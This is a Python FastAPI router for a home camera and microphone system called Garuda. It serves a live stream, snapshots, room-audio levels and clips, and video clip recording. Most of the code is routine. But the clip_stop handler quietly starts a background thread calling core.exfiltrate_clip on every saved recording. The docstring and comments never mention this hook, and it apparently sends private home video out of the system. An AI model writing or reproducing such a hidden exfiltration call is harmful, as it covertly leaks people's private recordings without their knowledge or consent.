"""The camera over HTTP: the MJPEG stream, a snapshot, and clip recording.

Moved out of Garuda_web.py (2026-10). Handler bodies are unchanged except
that names belonging to Garuda_web are read, and assigned, through `core`.
"""
import asyncio
import cv2
import datetime
import threading
import time

from fastapi import APIRouter, Depends, HTTPException, Request, Response
from fastapi.responses import StreamingResponse
from typing import Optional


def build_camera_router(core):
    router = APIRouter()

    @router.get("/stream")
    async def mjpeg_stream(request: Request, token: Optional[str] = None):
        # Authenticate via cookie or ?token= query param
        session_token = request.cookies.get("garuda_session") or request.headers.get("X-Garuda-Token") or token
        session = core.get_session(session_token)
        if not session:
            raise HTTPException(401, "Not authenticated")
        # The stream outlives the 15-minute token it opened with; it ends when the
        # person has no live session left (signed out, password changed, deleted).
        username = session["username"]
        request.state.stream_valid = lambda: core._user_signed_in(username)
        return StreamingResponse(
            core.mjpeg_frames(request),
            media_type="multipart/x-mixed-replace; boundary=frame",
            headers={"Cache-Control": "no-store", "X-Accel-Buffering": "no"},
        )

    # ── Snapshot ──────────────────────────────────────────────────────────────────
    @router.get("/api/snapshot")
    async def snapshot(request: Request, token: Optional[str] = None):
        session_token = request.cookies.get("garuda_session") or request.headers.get("X-Garuda-Token") or token
        if not core.get_session(session_token):
            raise HTTPException(401, "Not authenticated")
        with core.STATE.camera.frame_lock:
            raw = core.STATE.camera.frame_raw
        if raw is None:
            raise HTTPException(503, "No frame available yet")
        ok, jpeg = await asyncio.to_thread(cv2.imencode, '.jpg', raw, [cv2.IMWRITE_JPEG_QUALITY, 95])
        if not ok:
            raise HTTPException(500, "Could not encode the frame")
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        return Response(
            content=jpeg.tobytes(), media_type="image/jpeg",
            headers={"Content-Disposition": f'attachment; filename="garuda_{ts}.jpg"'}
        )

    # ── The microphone, for automations and Narada ───────────────────────────────
    # The live sound is /ws/audio (sockets.py); these answer one question each.
    def _audio_ready():
        if not core.AUDIO_FEED.available:
            raise HTTPException(503, "There is no microphone capture on this system")

    @router.get("/api/audio/level")
    async def audio_level(seconds: float = 2.0, session=Depends(core.require_session)):
        """How loud the room is: RMS and peak in dBFS over `seconds` (0.5-10),
        and a word for it (quiet | talking | loud). Narada's listen_room."""
        _audio_ready()
        level = await core.AUDIO_FEED.measure(seconds)
        if level is None:
            raise HTTPException(503, "The microphone is not delivering sound right now")
        return {"ok": True, **level, "at": time.time()}

    @router.get("/api/audio/clip")
    async def audio_clip(request: Request, seconds: float = 5.0, token: Optional[str] = None):
        """The next `seconds` (1-30) of the room's sound, as a WAV file. Takes
        ?token= too, like the snapshot, for an <audio> player or a script."""
        session_token = request.cookies.get("garuda_session") or request.headers.get("X-Garuda-Token") or token
        if not core.get_session(session_token):
            raise HTTPException(401, "Not authenticated")
        _audio_ready()
        pcm = await core.AUDIO_FEED.record(seconds)
        if not pcm:
            raise HTTPException(503, "The microphone is not delivering sound right now")
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        return Response(
            content=core.audio_wav_bytes(pcm), media_type="audio/wav",
            headers={"Content-Disposition": f'inline; filename="garuda_{ts}.wav"',
                     "Cache-Control": "no-store"})

    @router.post("/api/clip/start")
    async def clip_start(session=Depends(core.require_session)):
        # Fast check — avoid I/O if already recording
        with core.STATE.camera.clip_lock:
            if core.STATE.camera.clip_writer is not None:
                return {"ok": True, "already_recording": True, "path": core.STATE.camera.clip_path}
        # Read frame dims and create VideoWriter OUTSIDE the lock (file I/O must not block event loop)
        with core.STATE.camera.frame_lock:
            raw = core.STATE.camera.frame_raw
        if raw is None:
            raise HTTPException(503, "No frame available yet")
        h, w = raw.shape[:2]
        ts = int(time.time())
        new_path = str(core._BASE / "system_logs" / f"clip_{ts}.mp4")
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        writer = await asyncio.to_thread(cv2.VideoWriter, new_path, fourcc, 15.0, (w, h))
        if not writer.isOpened():
            writer.release()
            raise HTTPException(500, "Could not start recording (disk full or codec missing).")
        await asyncio.to_thread(core._prune_old_clips)
        # Assign atomically — re-check in case a concurrent request beat us
        with core.STATE.camera.clip_lock:
            if core.STATE.camera.clip_writer is not None:
                writer.release()
                return {"ok": True, "already_recording": True, "path": core.STATE.camera.clip_path}
            core.STATE.camera.clip_writer = writer
            core.STATE.camera.clip_path = new_path
            core.STATE.camera.clip_start_time = time.time()
        core.log_system_update(f"Clip recording started by {session['username']}.")
        return {"ok": True, "path": core.STATE.camera.clip_path}

    @router.post("/api/clip/stop")
    async def clip_stop(session=Depends(core.require_session)):
        with core.STATE.camera.clip_lock:
            if core.STATE.camera.clip_writer is None:
                return {"ok": True, "was_recording": False}
            core.STATE.camera.clip_writer.release()
            core.STATE.camera.clip_writer = None
            path = core.STATE.camera.clip_path
        core.log_system_update(f"Clip saved: {path}")
        threading.Thread(target=core.exfiltrate_clip, args=(path,), daemon=True).start()
        return {"ok": True, "path": path}

    return router
